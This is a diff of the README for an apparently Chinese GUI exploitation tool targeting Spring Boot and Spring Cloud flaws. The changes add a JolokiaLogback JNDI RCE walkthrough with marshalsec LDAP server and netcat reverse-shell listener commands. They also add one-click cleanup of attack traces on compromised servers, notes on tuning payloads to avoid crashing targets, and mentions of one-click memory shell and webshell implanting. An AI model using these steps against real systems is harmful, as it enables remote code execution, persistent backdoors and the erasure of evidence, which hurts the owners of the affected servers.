@@ -82,14 +82,14 @@ java -jar SpringBootVul_GUI.jar
 * [x] CVE-2021-21234任意文件读取
 * [x] h2数据库的控制台基于JNDI注入的RCE
 * [x] SpringCloud的SnakeYaml的RCE
-* [ ] jolokia中logback基于JNDI注入的RCE
-* [ ] jolokia中realm基于JNDI注入的RCE
-* [ ] mysql中jdbc基于反序列化的RCE
+* [x] jolokia中logback基于JNDI注入的RCE
+* [ ] jolokia中realm基于JNDI注入的RCE(需要ysoserial工具)
+* [ ] mysql中jdbc基于反序列化的RCE(暂不写，需配合痕迹清除一起用，不然造成对方数据库业务异常)
 
 ## 0x04短期目标 Prepare
 
 * [x] 一键打入内存马(目前只有Spring Cloud Gateway)
-* [ ] 部分RCE的痕迹一键清除
+* [x] 部分RCE的痕迹一键清除(spring cloud gateway)
 
 ## 0x05项目演示
 
@@ -119,9 +119,15 @@ java -jar SpringBootVul_GUI.jar
 
 ![](./image/1725462104669.jpg)
 
+**痕迹清除**
+
+默认清除poctest、pwnshell和expvul路由，其他路由自行判断
+
+![](./image/image-20241016110317955.png)
+
 ### #3 Eureka 反序列化RCE（慎用）
 
-直接点击getshell反弹，单纯poc测试的没写，python文件放同一目录下了，需要在vps启用2个端口，一个是你python服务器的端口，一个是反弹端口，写在python文件中，反弹端口默认是9000，注意这两个端口区别，输入框的端口是python端口
+直接点击getshell反弹，单纯poc测试的没写，python文件放同一目录下了，需要在vps启用2个端口，一个是你python服务器的端口，一个是反弹端口，写在python文件中，反弹端口默认是9000，注意这两个端口区别，输入框的端口是托管服务器端口
 
 ```bash
 nc -lvk 9000 # mac
@@ -135,7 +141,7 @@ python -m http.server 80
 
 ### #4 H2DatabaseSource RCE（慎用）
 
-目前已经基本完成一键getshell，理论上只要在不关闭的情况下可以无限弹，因为目前的payload是从T5开始的，如果遇到网站被测试过时，那大概率会报错而导致对方服务宕机，因为这是不回显RCE，无法判断到底有没有被测试过。
+目前已经基本完成一键getshell，理论上只要在不关闭的情况下可以无限弹，~~因为目前的payload是从T5开始的，如果遇到网站被测试过时，那大概率会报错而导致对方服务宕机~~，因为这是不回显RCE，无法判断到底有没有被测试过。现为随机生成3位数字，没有关闭工具的情况下默认递增。
 
 监听端口默认是**8881**
 
@@ -202,7 +208,9 @@ python -m http.server 80
 
 ### #8 H2DatabaseQueryRCE(慎用)
 
-这个也是跟H2dataSource漏洞一样，会使用sql语句来触发，考虑到无限弹shell并且如果一个网站同时测这两个漏洞，默认设置的含T5类似的，初始值是T15，代码写了递增，测试次数上要注意
+这个也是跟H2dataSource漏洞一样，会使用sql语句来触发，考虑到无限弹shell并且如果一个网站同时测这两个漏洞，~~默认设置的含T5类似的，初始值是T15，代码写了递增，测试次数上要注意~~
+
+现在为随机生成四位数字，没关闭工具情况下还是默认递增
 
 ```bash
 nc -lvk 8000 # mac
@@ -293,13 +301,32 @@ nc -lvp 9950 #linux
 
 ![](./image/image-20241010151607414.png)
 
-### #13 端点扫描
+### #13 JolokiaLogback的JNDI的RCE
+
+漏洞执行流程：服务器访问xml文件，通过xxe漏洞去访问ldap，然后跳转到JNDI恶意类加载
+
+切换到resources文件夹，工具的监听端口是nc的端口，不是80
+
+```bash
+python -m http.server 80
+
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:80/\#JolokiaLogback 1389
+```
+
+```bash
+nc -lvp 9090 #linux
+nc -lvk 9090 #mac
+```
+
+![](./image/image-20241015163619279.png)
+
+### #14 端点扫描
 
 端点扫描经过延时降速处理，heapdump可以下载大文件，用了分块，做了个小进度条，以后优化下，textflow布局以后要改
 
 ![](./image/image-20240914013633068.png)
 
-### #14 一键上马
+### #15 一键上马
 
 ![](./image/WechatIMG1409.jpg)
 
